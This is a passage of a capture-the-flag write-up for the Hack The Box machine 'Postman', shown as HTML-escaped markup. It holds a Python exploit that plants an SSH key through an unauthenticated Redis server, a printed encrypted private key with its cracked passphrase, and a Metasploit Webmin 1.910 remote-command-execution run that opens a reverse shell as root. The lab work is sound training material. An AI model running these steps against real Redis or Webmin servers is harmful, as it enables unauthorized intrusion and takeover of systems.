&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;*******************************************************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s2"&gt; SSH Keys Need to be Generated&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ssh-keygen -t rsa -C &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;acid_creative&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s2"&gt; Keys Generated Successfully&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;blue&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;(echo &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\r\n\&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;; cat $HOME/.ssh/id_rsa.pub; echo  &lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;\r\n\&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;) &amp;gt; $HOME/.ssh/public_key.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;redis-cli -h &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_address&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; flushall&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;redis-cli -h &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_address&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cat $HOME/.ssh/public_key.txt | redis-cli -h &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;  &lt;span class="n"&gt;ip_address&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; -x set cracklist&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; config set dbfilename &amp;quot;backup.db&amp;quot; &amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;cmd4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; config set dir &amp;quot;/var/lib/redis/.ssh/&amp;quot; &amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd5&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; config set dbfilename &amp;quot;authorized_keys&amp;quot; &amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cmd6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cmd1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; save&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s2"&gt;You&amp;#39;ll get shell in sometime..Thanks for your patience&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;green&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;ssh_connection&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Something went wrong&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;colored&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s2"&gt;Redis-cli:::::This utility is not present on your system. You need to install it to proceed further.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;red&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Running this script will give us a shell as redis.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python redis.py 10.10.10.160 redis&lt;/span&gt;
&lt;span class="code-line"&gt;  *******************************************************************&lt;/span&gt;
&lt;span class="code-line"&gt;  * [+] [Exploit] Exploiting misconfigured REDIS SERVER*&lt;/span&gt;
&lt;span class="code-line"&gt;  * [+] AVINASH KUMAR THAPA aka &amp;quot;-Acid&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;  *******************************************************************&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  SSH Keys Need to be Generated&lt;/span&gt;
&lt;span class="code-line"&gt;Generating public/private rsa key pair.&lt;/span&gt;
&lt;span class="code-line"&gt;Enter file in which to save the key (/root/.ssh/id_rsa):&lt;/span&gt;
&lt;span class="code-line"&gt;/root/.ssh/id_rsa already exists.&lt;/span&gt;
&lt;span class="code-line"&gt;Overwrite (y/n)? y&lt;/span&gt;
&lt;span class="code-line"&gt;Enter passphrase (empty for no passphrase):&lt;/span&gt;
&lt;span class="code-line"&gt;Enter same passphrase again:&lt;/span&gt;
&lt;span class="code-line"&gt;Your identification has been saved in /root/.ssh/id_rsa.&lt;/span&gt;
&lt;span class="code-line"&gt;Your public key has been saved in /root/.ssh/id_rsa.pub.&lt;/span&gt;
&lt;span class="code-line"&gt;The key fingerprint is:&lt;/span&gt;
&lt;span class="code-line"&gt;SHA256:AXkEW81gyz1YrQfxEQw3t82W/NoAp6q8IdpYTPV8sN0 acid_creative&lt;/span&gt;
&lt;span class="code-line"&gt;The key&amp;#39;s randomart image is:&lt;/span&gt;
&lt;span class="code-line"&gt;+---[RSA 3072]----+&lt;/span&gt;
&lt;span class="code-line"&gt;|      o+=++==..  |&lt;/span&gt;
&lt;span class="code-line"&gt;|      .*.=+oo+.+.|&lt;/span&gt;
&lt;span class="code-line"&gt;|      ..* +oo oo+|&lt;/span&gt;
&lt;span class="code-line"&gt;|       . +.=.= ..|&lt;/span&gt;
&lt;span class="code-line"&gt;|      . S +.+ E .|&lt;/span&gt;
&lt;span class="code-line"&gt;|     o     o   + |&lt;/span&gt;
&lt;span class="code-line"&gt;|      + . .   . .|&lt;/span&gt;
&lt;span class="code-line"&gt;|     = o o       |&lt;/span&gt;
&lt;span class="code-line"&gt;|    o . +.       |&lt;/span&gt;
&lt;span class="code-line"&gt;+----[SHA256]-----+&lt;/span&gt;
&lt;span class="code-line"&gt;  Keys Generated Successfully&lt;/span&gt;
&lt;span class="code-line"&gt;OK&lt;/span&gt;
&lt;span class="code-line"&gt;OK&lt;/span&gt;
&lt;span class="code-line"&gt;OK&lt;/span&gt;
&lt;span class="code-line"&gt;OK&lt;/span&gt;
&lt;span class="code-line"&gt;OK&lt;/span&gt;
&lt;span class="code-line"&gt;OK&lt;/span&gt;
&lt;span class="code-line"&gt;  You&amp;#39;ll get shell in sometime..Thanks for your patience&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;* Documentation:  https://help.ubuntu.com&lt;/span&gt;
&lt;span class="code-line"&gt;* Management:     https://landscape.canonical.com&lt;/span&gt;
&lt;span class="code-line"&gt;* Support:        https://ubuntu.com/advantage&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;* Canonical Livepatch is available for installation.&lt;/span&gt;
&lt;span class="code-line"&gt;  - Reduce system reboots and improve kernel security. Activate at:&lt;/span&gt;
&lt;span class="code-line"&gt;    https://ubuntu.com/livepatch&lt;/span&gt;
&lt;span class="code-line"&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Wed Nov 20 15:31:13 2019 from 10.10.14.110&lt;/span&gt;
&lt;span class="code-line"&gt;redis@Postman:~$&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
&lt;p&gt;We start enumerating. We quickly see that the user is &lt;code&gt;Matt&lt;/code&gt;. Our &lt;code&gt;redis&lt;/code&gt; user
has a non-empty bash history we can look at.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis@Postman:~$ cat .bash_history&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;su Matt&lt;/span&gt;
&lt;span class="code-line"&gt;pwd&lt;/span&gt;
&lt;span class="code-line"&gt;nano scan.py&lt;/span&gt;
&lt;span class="code-line"&gt;python scan.py&lt;/span&gt;
&lt;span class="code-line"&gt;nano scan.py&lt;/span&gt;
&lt;span class="code-line"&gt;clear&lt;/span&gt;
&lt;span class="code-line"&gt;nano scan.py&lt;/span&gt;
&lt;span class="code-line"&gt;clear&lt;/span&gt;
&lt;span class="code-line"&gt;python scan.py&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;cat /etc/ssh/sshd_config&lt;/span&gt;
&lt;span class="code-line"&gt;su Matt&lt;/span&gt;
&lt;span class="code-line"&gt;clear&lt;/span&gt;
&lt;span class="code-line"&gt;cd /var/lib/redis&lt;/span&gt;
&lt;span class="code-line"&gt;su Matt&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;cat id_rsa.bak&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;cat id_rsa.bak&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
&lt;span class="code-line"&gt;crontab -l&lt;/span&gt;
&lt;span class="code-line"&gt;systemctl enable redis-server&lt;/span&gt;
&lt;span class="code-line"&gt;redis-server&lt;/span&gt;
&lt;span class="code-line"&gt;ifconfig&lt;/span&gt;
&lt;span class="code-line"&gt;netstat -a&lt;/span&gt;
&lt;span class="code-line"&gt;netstat -a&lt;/span&gt;
&lt;span class="code-line"&gt;netstat -a&lt;/span&gt;
&lt;span class="code-line"&gt;netstat -a&lt;/span&gt;
&lt;span class="code-line"&gt;netstat -a &amp;gt; txt&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;crontab -l&lt;/span&gt;
&lt;span class="code-line"&gt;cd ~/&lt;/span&gt;
&lt;span class="code-line"&gt;ls&lt;/span&gt;
&lt;span class="code-line"&gt;nano 6379&lt;/span&gt;
&lt;span class="code-line"&gt;exit&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When searching for the files mentioned in the history we found that the
&lt;code&gt;id_rsa.bak&lt;/code&gt; key exist in &lt;code&gt;/opt/&lt;/code&gt; and is an encrypted RSA private key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis@Postman:~$ find / -name &amp;#39;id_rsa.bak&amp;#39; 2&amp;gt; /dev/null^C&lt;/span&gt;
&lt;span class="code-line"&gt;/opt/id_rsa.bak&lt;/span&gt;
&lt;span class="code-line"&gt;redis@Postman:~$ cat /opt/id_rsa.bak&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;Proc-Type: 4,ENCRYPTED&lt;/span&gt;
&lt;span class="code-line"&gt;DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX&lt;/span&gt;
&lt;span class="code-line"&gt;cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2&lt;/span&gt;
&lt;span class="code-line"&gt;7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6&lt;/span&gt;
&lt;span class="code-line"&gt;cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9&lt;/span&gt;
&lt;span class="code-line"&gt;1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv&lt;/span&gt;
&lt;span class="code-line"&gt;EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP&lt;/span&gt;
&lt;span class="code-line"&gt;UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY&lt;/span&gt;
&lt;span class="code-line"&gt;Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK&lt;/span&gt;
&lt;span class="code-line"&gt;t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS&lt;/span&gt;
&lt;span class="code-line"&gt;5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke&lt;/span&gt;
&lt;span class="code-line"&gt;P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6&lt;/span&gt;
&lt;span class="code-line"&gt;jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge&lt;/span&gt;
&lt;span class="code-line"&gt;SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i&lt;/span&gt;
&lt;span class="code-line"&gt;l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X&lt;/span&gt;
&lt;span class="code-line"&gt;0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p&lt;/span&gt;
&lt;span class="code-line"&gt;S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR&lt;/span&gt;
&lt;span class="code-line"&gt;hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+&lt;/span&gt;
&lt;span class="code-line"&gt;Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V&lt;/span&gt;
&lt;span class="code-line"&gt;XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD&lt;/span&gt;
&lt;span class="code-line"&gt;b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi&lt;/span&gt;
&lt;span class="code-line"&gt;WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh&lt;/span&gt;
&lt;span class="code-line"&gt;KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm&lt;/span&gt;
&lt;span class="code-line"&gt;npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ&lt;/span&gt;
&lt;span class="code-line"&gt;VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W&lt;/span&gt;
&lt;span class="code-line"&gt;X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==&lt;/span&gt;
&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We copy the key on our computer and use &lt;code&gt;ssh2john&lt;/code&gt; to extract the hash from the
key and run a john on it: the password is &lt;code&gt;computer2008&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python2 /usr/bin/ssh2john redis_rsa &amp;gt; redis_rsa.hash&lt;/span&gt;
&lt;span class="code-line"&gt;john redis_rsa.hash -w=rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;computer2008&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The key does not allow us to connect using the SSH key (the ssh connection
closed immediately). I also tried this creds for a locally elevation with &lt;code&gt;su&lt;/code&gt;
and it works… I do not know why the user will have the same password as it
sshkey passphrase but it works and we get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;redis@Postman:~$ su Matt&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;Matt@Postman:/var/lib/redis$ cd&lt;/span&gt;
&lt;span class="code-line"&gt;Matt@Postman:~$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Matt@Postman:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;517ad0&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;p&gt;The previous creds also work on the webmin authentication form allowing us to
login an see the webmin version: 1.910.&lt;/p&gt;
&lt;p&gt;&lt;img alt="webmin dashboard" src="/media/2020.03/postman_1.png"&gt;&lt;/p&gt;
&lt;p&gt;The exploit for searchsploit should works.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Webmin 1.910 - &amp;#39;Package Updates&amp;#39; Remote Command Execution (Metasploit)  | exploits/linux/remote/46984.rb&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We import the script in metasploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkdir ~/.msf/modules/exploits/linux/remote&lt;/span&gt;
&lt;span class="code-line"&gt;cp /usr/share/exploitdb/exploits/linux/remote/46984.rb&lt;/span&gt;
&lt;span class="code-line"&gt;updated&lt;/span&gt;
&lt;span class="code-line"&gt;msfconsole&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We give to metasploit all the needed information (user, password, IPs) and do
not forget to put the &lt;code&gt;SSL&lt;/code&gt; parameter to &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(linux/remote/46984) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (exploit/linux/remote/46984):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  PASSWORD   computer2008     yes       Webmin Password&lt;/span&gt;
&lt;span class="code-line"&gt;  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
&lt;span class="code-line"&gt;  RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  RPORT      10000            yes       The target port (TCP)&lt;/span&gt;
&lt;span class="code-line"&gt;  SSL        true             no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
&lt;span class="code-line"&gt;  TARGETURI  /                yes       Base path for Webmin application&lt;/span&gt;
&lt;span class="code-line"&gt;  USERNAME   Matt             yes       Webmin Username&lt;/span&gt;
&lt;span class="code-line"&gt;  VHOST                       no        HTTP server virtual host&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Payload options (cmd/unix/reverse_perl):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name   Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----   ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  LHOST  10.10.14.13      yes       The listen address (an interface may be specified)&lt;/span&gt;
&lt;span class="code-line"&gt;  LPORT  4444             yes       The listen port&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit target:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Id  Name&lt;/span&gt;
&lt;span class="code-line"&gt;  --  ----&lt;/span&gt;
&lt;span class="code-line"&gt;  0   Webmin &amp;lt;= 1.910&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we run the script. We are directly root on the box and get the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(linux/remote/46984) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.13:4444&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Session cookie: a2ff4450e3a344159ab1fd464db52855&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Attempting to execute the payload...&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Command shell session 1 opened (10.10.14.13:4444 -&amp;gt; 10.10.10.160:32916) at 2019-11-20 14:39:02 +0100&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
